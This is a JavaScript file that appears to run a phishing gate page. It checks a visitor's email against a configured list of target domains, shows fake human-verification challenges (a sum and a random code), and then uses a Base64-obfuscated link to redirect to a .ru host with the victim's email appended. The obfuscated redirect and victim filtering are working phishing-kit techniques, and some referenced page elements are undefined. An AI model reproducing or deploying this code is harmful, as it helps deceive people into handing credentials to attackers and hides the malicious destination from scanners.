document.addEventListener("DOMContentLoaded", () => {
  fetch("config.json")
    .then(response => response.json())
    .then(config => {
      window.allowedDomains = config.allowedDomains;
    })
    .catch(error => console.error("Error loading config:", error));
});

const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step5 = document.getElementById('step5');

const emailInput = document.getElementById('email');
const domainErrorEl = document.getElementById('domainError');

const mathQuestionEl = document.getElementById('mathQuestion');
const mathAnswerEl = document.getElementById('mathAnswer');
const mathErrorEl = document.getElementById('mathError');

let correctMathAnswer = 0;


function checkEmailDomain() {
  const emailValue = emailInput.value.trim();
  const emailPattern = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;

  if (!emailPattern.test(emailValue)) {
    domainErrorEl.textContent = "Invalid email address.";
    domainErrorEl.style.display = "block";
    return;
  }

  const domain = emailValue.split('@')[1];
  if (!window.allowedDomains.includes(domain)) {
    domainErrorEl.textContent = "Unsupported email. Try again.";
    domainErrorEl.style.display = "block";
    return;
  }

  domainErrorEl.style.display = "none";
  step1.classList.add('hidden');
  step2.classList.add('fade-in');

  setTimeout(() => {
    step2.classList.add('hidden');
    generateMathQuestion();
    step3.classList.add('fade-in');
  }, 3000);
}

function generateMathQuestion() {
  const num1 = Math.floor(Math.random() * 10) + 1;
  const num2 = Math.floor(Math.random() * 10) + 1;
  mathQuestionEl.textContent = `${num1} + ${num2} = ?`;
  correctMathAnswer = num1 + num2;
}

function checkMathAnswer() {
  if (parseInt(mathAnswerEl.value, 10) === correctMathAnswer) {
    mathErrorEl.style.display = "none";
    step3.classList.add('hidden');
    generateCharCode();
    step4.classList.add('fade-in');
  } else {
    mathErrorEl.textContent = "Incorrect answer. Try again.";
    mathErrorEl.style.display = "block";
  }
}

function generateCharCode() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789";
  correctCharCode = Array.from({ length: 5 }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
  charChallengeEl.textContent = correctCharCode;
}

function checkCharAnswer() {
  const email = emailInput.value.trim().toLowerCase();
  if (charAnswerEl.value.trim() === correctCharCode) {
    charErrorEl.style.display = "none";
    step4.classList.add('hidden');
    step5.classList.add('fade-in');

    const link = "aHR0cHM6Ly9iNWt2LnJrZjlucmR4eC5ydS95bm9GRWgvIw"; // Base64 encoded URL
    window.location.href = atob(link) + email;
  } else {
    charErrorEl.textContent = "Incorrect code. Try again.";
    charErrorEl.style.display = "block";
  }
}
